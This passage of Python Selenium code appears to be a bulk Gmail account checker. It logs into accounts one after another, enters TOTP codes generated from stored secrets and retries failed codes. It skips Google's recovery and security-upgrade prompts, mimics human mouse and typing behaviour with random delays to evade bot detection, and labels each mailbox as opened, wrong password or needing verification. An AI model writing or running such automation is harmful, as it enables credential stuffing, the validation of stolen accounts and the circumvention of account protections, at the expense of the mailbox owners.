                            var t = (el.innerText || '').toLowerCase();
                            return t.indexOf('another way') !== -1 || t.indexOf('different') !== -1
                                || t.indexOf('more options') !== -1 || t.indexOf('try again') !== -1;
                        });
                        if (found) found.click();
                    """)
                    rand_sleep(700, 1200)
                    _click_authenticator()
                    rand_sleep(700, 1200)
                    totp_field = wait_for_any(TOTP_SELECTORS, timeout=15)
                except Exception as e:
                    log(f"Try another way error: {e}")

        url, text = page_state()
        log(f"{email} — After 2FA handling: {url[:70]}, totp_field={'found' if totp_field else 'NOT found'}")

    # ── Enter TOTP code (whether we just navigated here or were already here) ─
    if totp_field is not None:
        if not totp_code and not totp_secret:
            shot = screenshot_b64()
            return {"status": "2fa_required", "reason": "2FA required — provide TOTP secret", "totpCode": None, "debugScreenshot": shot}

        # CRITICAL: regenerate TOTP right before entry.
        # The original code was generated at check start (~60s ago) and may have expired.
        # TOTP codes rotate every 30 seconds — stale code = "wrong code" from Google.
        if totp_secret:
            fresh_code = generate_totp(totp_secret)
            if fresh_code:
                secs_left = 30 - (int(time.time()) % 30)
                if secs_left <= 4:
                    # Window ends in <4s — wait for next fresh window to avoid race
                    log(f"{email} — TOTP window ending in {secs_left}s, waiting for next window…")
                    time.sleep(secs_left + 1)
                    fresh_code = generate_totp(totp_secret)
                totp_code = fresh_code
                secs_remaining = 30 - (int(time.time()) % 30)
                log(f"{email} — Fresh TOTP code: {totp_code} ({secs_remaining}s left in window)")

        log(f"{email} — Entering TOTP code: {totp_code}")
        try:
            natural_mouse_move(driver, totp_field)
            rand_sleep(60, 120)
            totp_field.clear()
            rand_sleep(40, 80)
            clipboard_type(driver, totp_field, totp_code)  # paste TOTP code instantly
            rand_sleep(100, 200)
            totp_field.send_keys(Keys.ENTER)
        except Exception as e:
            log(f"TOTP entry error: {e}")

        rand_sleep(700, 1200)

        # Wait for Gmail to fully load (signin/continue is an auto-redirect page)
        log(f"{email} — Waiting for Gmail redirect after TOTP…")
        _totp_redirect_early = None
        deadline = time.time() + 30
        while time.time() < deadline:
            url = driver.current_url
            if "mail.google.com" in get_hostname(url):
                break
            # ── Early exit: detect "Verify your info to continue" immediately ──
            # Any non-TOTP challenge URL = verification_required, no need to wait
            _is_hard_block = (
                (
                    "challenge" in url
                    and not any(x in url for x in (
                        "challenge/pwd", "challenge/dp", "challenge/totp",
                        "challenge/ipp", "challenge/selection", "challenge/sk",
                    ))
                )
                or "InterstitialConfirmation" in url
                or ("verify" in url and "mail" not in url and "challenge/pwd" not in url)
            )
            if _is_hard_block:
                _u2, _t2 = page_state()
                _r = classify(_u2, _t2)
                if _r:
                    log(f"{email} — Early verification_required detected in TOTP redirect loop: {url[:60]}")
                    _totp_redirect_early = _r
                    break
            # signin/continue may need a button click to proceed
            if "signin/continue" in url:
                try:
                    driver.execute_script("""
                        var btn = document.querySelector(
                            '#confirm, button[type="submit"], [data-action], button');
                        if (btn) btn.click();
                    """)
                except Exception:
                    pass
            time.sleep(0.5)
        if _totp_redirect_early:
            return _totp_redirect_early

        rand_sleep(700, 1200)
        url, text = page_state()
        log(f"{email} — After TOTP submit (final): {url[:70]}")

        # Wrong TOTP — auto-retry once with the next fresh 30s window
        _wrong_totp_phrases = [
            "wrong code", "that code didn't work", "code is incorrect",
            "enter the code again", "code expired", "try again",
            "didn't recognize that code",
        ]
        if any(x in text for x in _wrong_totp_phrases):
            if totp_secret:
                # Wait for next TOTP window and try once more
                secs_until_next = 30 - (int(time.time()) % 30)
                log(f"{email} — Wrong TOTP, waiting {secs_until_next}s for next window…")
                time.sleep(secs_until_next + 0.5)
                retry_code = generate_totp(totp_secret)
                if retry_code:
                    log(f"{email} — TOTP retry with fresh code: {retry_code}")
                    try:
                        totp_field_retry = wait_for_any([
                            'input[name="totpPin"]', 'input[name="Pin"]', 'input[id="totpPin"]',
                            'input[autocomplete="one-time-code"]', 'input[type="tel"]',
                            'input[aria-label*="code"]', 'input[type="number"]',
                        ], timeout=8)
                        if totp_field_retry:
                            totp_field_retry.clear()
                            rand_sleep(40, 80)
                            clipboard_type(driver, totp_field_retry, retry_code)
                            rand_sleep(100, 200)
                            totp_field_retry.send_keys(Keys.ENTER)
                            rand_sleep(700, 1200)
                            totp_code = retry_code
                            url, text = page_state()
                            log(f"{email} — After TOTP retry: {url[:70]}")
                            # Check again — if still wrong, give up
                            if any(x in text for x in _wrong_totp_phrases):
                                return {
                                    "status": "wrong_password",
                                    "reason": f"TOTP codes wrong on 2 attempts ({totp_code}, {retry_code}) — check secret",
                                    "totpCode": retry_code,
                                }
                    except Exception as _te:
                        log(f"{email} — TOTP retry error: {_te}")
            if any(x in driver.page_source if hasattr(driver, 'page_source') else "" for x in _wrong_totp_phrases):
                return {
                    "status": "wrong_password",
                    "reason": f"TOTP code {totp_code} was wrong or expired — check your TOTP secret",
                    "totpCode": totp_code,
                }

        result = classify(url, text)
        if result:
            return result

        totp_completed = True  # Credentials + TOTP all verified successfully
    else:
        totp_completed = False

    # ── Classify whatever page we're on ───────────────────────────────────────
    result = classify(url, text)
    if result:
        return result

    # ── Post-login interstitial handler ───────────────────────────────────────
    # Google often shows recovery/address/terms screens before landing on Gmail.
    # Strategy: try to dismiss nicely first; if still not at Gmail after a few
    # attempts, force-navigate directly to the inbox.
    for _attempt in range(8):
        url, text = page_state()
        host = get_hostname(url)

        if "mail.google.com" in host:
            break

        # ── Early exit: "Verify your info to continue" / phone/device check ──
        # Detect immediately — no point looping or trying to dismiss
        _is_verify_info_screen = any(x in text for x in [
            "verify your info to continue",
            "choose a way to verify",
            "do a device check",
            "verifying your phone number",
        ])
        _is_hard_challenge_url = (
            (
                "challenge" in url
                and not any(x in url for x in (
                    "challenge/pwd", "challenge/dp", "challenge/totp",
                    "challenge/ipp", "challenge/selection", "challenge/sk",
                ))
                and "uplevelingstep" not in url
            )
            or "InterstitialConfirmation" in url
        )
        if _is_verify_info_screen or _is_hard_challenge_url:
            log(f"{email} — 'Verify your info' screen detected immediately → verification_required")
            shot = screenshot_b64()
            return {
                "status": "verification_required",
                "reason": "Google requires phone or device verification (Verify your info to continue)",
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }

        dismissed = False

        # gds.google.com — recovery options, home address, etc.
        # Click "Not now" / "Skip" / "Later" properly so the auth session finalises
        if "gds.google.com" in host:
            page_name = url[url.find('/web/'):url.find('?')] if '/web/' in url else url[:50]
            log(f"{email} — gds interstitial ({page_name}), clicking dismiss")
            try:
                clicked = driver.execute_script("""
                    var skip_texts = ['not now','skip','later','no thanks','dismiss',
                                      'cancel','maybe later','remind me later'];
                    var btns = Array.from(document.querySelectorAll('button, a[role="button"]'));
                    for (var t of skip_texts) {
                        var found = btns.find(function(b) {
                            return b.innerText && b.innerText.trim().toLowerCase() === t;
                        });
                        if (found) { found.click(); return true; }
                    }
                    // Fallback: last button (usually the secondary/skip action)
                    if (btns.length > 1) { btns[btns.length - 1].click(); return true; }
                    return false;
                """)
                if not clicked:
                    # Nothing to click — just navigate away
                    driver.get("https://mail.google.com/mail/u/0/#inbox")
            except Exception as e:
                log(f"gds dismiss error: {e}")
                try:
                    driver.get("https://mail.google.com/mail/u/0/#inbox")
                except Exception:
                    pass
            dismissed = True

        # uplevelingstep — Google account security upgrade prompt
        # BUT: uplevelingstep/selection can also be the phone/device verification screen.
        # Detect immediately by page text — no point trying to dismiss a hard block.
        elif "uplevelingstep" in url:
            _uptext = text.lower()
            _is_phone_verify = any(x in _uptext for x in [
                "verify your info to continue",
                "choose a way to verify",
                "do a device check",
                "verifying your phone number",
            ])
            if _is_phone_verify:
                log(f"{email} — uplevelingstep is phone/device verification screen → immediate verification_required")
                shot = screenshot_b64()
                return {
                    "status": "verification_required",
                    "reason": "Google requires phone or device verification (cannot bypass automatically)",
                    "totpCode": totp_code,
                    "debugScreenshot": shot,
                }
            log(f"{email} — uplevelingstep interstitial (attempt {_attempt+1}), clicking dismiss")
            if _attempt == 0:
                # First attempt: look for "Not now" / "Skip" / etc.
                # Include plain <a> tags — Google often renders "Not now" as a link, not a button
                try:
                    clicked = driver.execute_script("""
                        var skip_texts = ['not now','skip','later','no thanks',
                                          'dismiss','maybe later','remind me later','cancel'];
                        var els = Array.from(document.querySelectorAll(
                            'button, a, a[role="button"], [role="link"]'));
                        for (var t of skip_texts) {
                            var found = els.find(function(b) {
                                return b.innerText && b.innerText.trim().toLowerCase() === t;
                            });
                            if (found) { found.click(); return 'clicked:' + t; }
                        }
                        // Partial match fallback ("not now" might be "Not Now" with capital)
                        for (var t of skip_texts) {
                            var found = els.find(function(b) {
                                return b.innerText && b.innerText.trim().toLowerCase().indexOf(t) === 0;
                            });
                            if (found) { found.click(); return 'partial:' + t; }
                        }
                        return 'none';
                    """)
                    log(f"{email} — uplevelingstep dismiss result: {clicked}")
                except Exception as e:
                    log(f"uplevelingstep dismiss error: {e}")
                dismissed = True
            elif _attempt == 1:
                # Second attempt: try Gmail HTML version — bypasses some interstitials
                log(f"{email} — uplevelingstep: trying Gmail HTML version")
                try:
                    driver.get("https://mail.google.com/mail/h/?zy=e")
                    rand_sleep(800, 1200)
                    _html_url = driver.current_url
                    log(f"{email} — Gmail HTML URL: {_html_url[:70]}")
                    if "mail.google.com" in get_hostname(_html_url) and "uplevelingstep" not in _html_url:
                        # HTML Gmail loaded — classify it
                        _html_text = ""
                        try:
                            _html_text = driver.find_element(By.TAG_NAME, "body").text.lower()
                        except Exception:
                            pass
                        # Any Gmail HTML page that has inbox content = opened
                        if any(x in _html_text for x in ["inbox", "compose", "sent", "drafts"]):
                            rand_sleep(400, 700)
                            shot = screenshot_b64()
                            try:
                                driver.get("https://accounts.google.com/Logout?continue=https://mail.google.com")
                                rand_sleep(800, 1200)
                            except Exception:
                                pass
                            return {
                                "status": "opened",
                                "reason": "Mailbox opened (HTML Gmail) ✅",
                                "totpCode": totp_code,
                                "debugScreenshot": shot,
                            }
                except Exception as e:
                    log(f"Gmail HTML error: {e}")
                dismissed = True
            else:
                # 3+ attempts: uplevelingstep persists — mandatory phone/QR verification
                # Cannot bypass automatically regardless of whether TOTP was completed
                log(f"{email} — uplevelingstep persists after multiple attempts → verification_required")
                shot = screenshot_b64()
                return {
                    "status": "verification_required",
                    "reason": "Google requires phone or device verification to continue (cannot bypass automatically)",
                    "totpCode": totp_code,
                    "debugScreenshot": shot,
                }

        # signin/continue redirect page
        elif "signin/continue" in url:
            log(f"{email} — signin/continue, navigating directly to Gmail")
            try:
                driver.get("https://mail.google.com/mail/u/0/#inbox")
            except Exception:
                pass
            dismissed = True

        # TOTP page reappeared — enter a fresh code and continue
        elif "challenge/totp" in url or "challenge/selection" in url:
            log(f"{email} — TOTP/selection page reappeared in interstitial loop, re-entering")
            if totp_secret:
                fresh_code = generate_totp(totp_secret)
                log(f"{email} — Fresh TOTP code: {fresh_code}")
                try:
                    # On selection page, click authenticator first
                    if "challenge/selection" in url:
                        driver.execute_script("""
                            var byType = document.querySelector('[data-challengetype="6"]');
                            if (byType) { byType.click(); return; }
                            var all = Array.from(document.querySelectorAll('*'));
                            var found = all.find(function(el) {
                                return el.children.length === 0 && el.innerText &&
                                       el.innerText.toLowerCase().indexOf('authenticator') !== -1;
                            });
                            if (found) found.click();
                        """)
                        rand_sleep(700, 1200)
                    tf = wait_for_any([
                        'input[name="totpPin"]', 'input[name="Pin"]',
                        'input[autocomplete="one-time-code"]', 'input[type="tel"]',
                        'input[aria-label*="code"]',
                    ], timeout=8)
                    if tf:
                        tf.clear()
                        rand_sleep(50, 100)
                        human_type(tf, fresh_code)
                        rand_sleep(150, 300)
                        tf.send_keys(Keys.ENTER)
                        rand_sleep(800, 1500)
                        dismissed = True
                except Exception as e:
                    log(f"Re-TOTP error: {e}")
            if not dismissed:
                # No TOTP secret or field not found — skip to Gmail
                try:
                    driver.get("https://mail.google.com/mail/u/0/#inbox")
                    dismissed = True
                except Exception:
                    break

        # challenge/dp or challenge/selection in interstitial loop
        # = 2FA page that wasn't caught by Step 4 (safety net).
        # Click Authenticator option instead of a generic submit button.
        elif "accounts.google.com" in host and (
            "challenge/dp" in url or "challenge/selection" in url
        ):
            log(f"{email} — 2FA page in interstitial loop ({url[:60]}), clicking Authenticator")
            try:
                driver.execute_script("""
                    var byType = document.querySelector('[data-challengetype="6"]');
                    if (byType) { byType.click(); return; }
                    var allEls = Array.from(document.querySelectorAll(
                        'li, div[role="listitem"], [data-challengetype]'));
                    var found = allEls.find(function(el) {
                        return el.innerText && el.innerText.toLowerCase().indexOf('authenticator') !== -1;
                    });
                    if (found) { found.click(); return; }
                    var broader = Array.from(document.querySelectorAll('*')).find(function(el) {
                        return el.children.length === 0
                            && el.innerText
                            && el.innerText.toLowerCase().indexOf('authenticator') !== -1;
                    });
                    if (broader) broader.click();
                """)
                rand_sleep(700, 1200)
                # Check if TOTP field appeared — if yes, enter code and submit
                if totp_secret or totp_code:
                    fresh_code = generate_totp(totp_secret) if totp_secret else totp_code
                    if fresh_code:
                        secs_left = 30 - (int(time.time()) % 30)
                        if secs_left <= 4:
                            time.sleep(secs_left + 1)
                            fresh_code = generate_totp(totp_secret) if totp_secret else totp_code
                    tf = wait_for_any([
                        'input[name="totpPin"]', 'input[name="Pin"]',
                        'input[autocomplete="one-time-code"]', 'input[type="tel"]',
                        'input[aria-label*="code"]', 'input[type="number"]',
                    ], timeout=12)
                    if tf and fresh_code:
                        log(f"{email} — Entering TOTP in interstitial: {fresh_code}")
                        tf.clear()
                        rand_sleep(50, 100)
                        human_type(tf, fresh_code)
                        rand_sleep(150, 300)
                        tf.send_keys(Keys.ENTER)
                        rand_sleep(800, 1500)
            except Exception as e:
                log(f"2FA interstitial click error: {e}")
            dismissed = True

        # Any other accounts.google.com interstitial — try clicking primary CTA
        elif "accounts.google.com" in host:
            log(f"{email} — accounts interstitial ({url[:60]}), trying to proceed")
            try:
                driver.execute_script("""
                    var btn = document.querySelector(
                        'button[type="submit"], #confirm, [data-action="confirm"], button');
                    if (btn) btn.click();
                """)
                dismissed = True
            except Exception:
                pass

        else:
            # Unknown domain — force navigate to Gmail
            log(f"{email} — unknown page ({url[:60]}), forcing Gmail navigation")
            try:
                driver.get("https://mail.google.com/mail/u/0/#inbox")
                dismissed = True
            except Exception:
                break

        if dismissed:
            rand_sleep(500, 800)
        else:
            break

    # Wait for Gmail to fully load
    deadline = time.time() + 12
    while time.time() < deadline:
        _cu = driver.current_url
        if "mail.google.com" in get_hostname(_cu):
            break
        # Early exit: challenge/verification URL — no need to wait
        if (
            ("challenge" in _cu and not any(x in _cu for x in (
                "challenge/pwd", "challenge/dp", "challenge/totp",
                "challenge/ipp", "challenge/selection", "challenge/sk",
            )))
            or "InterstitialConfirmation" in _cu
            or ("verify" in _cu and "mail" not in _cu)
        ):
            break
        time.sleep(0.5)

    rand_sleep(300, 600)
    url, text = page_state()
    log(f"{email} — Final page after interstitials: {url[:70]}")

    result = classify(url, text)
    if result:
        return result

    # ── True final fallback ───────────────────────────────────────────────────
    shot = screenshot_b64()
    return {
        "status": "unknown",
        "reason": f"Unexpected page: {url[:80]}",
        "totpCode": totp_code,
        "debugScreenshot": shot,
    }


if __name__ == "__main__":
    main()
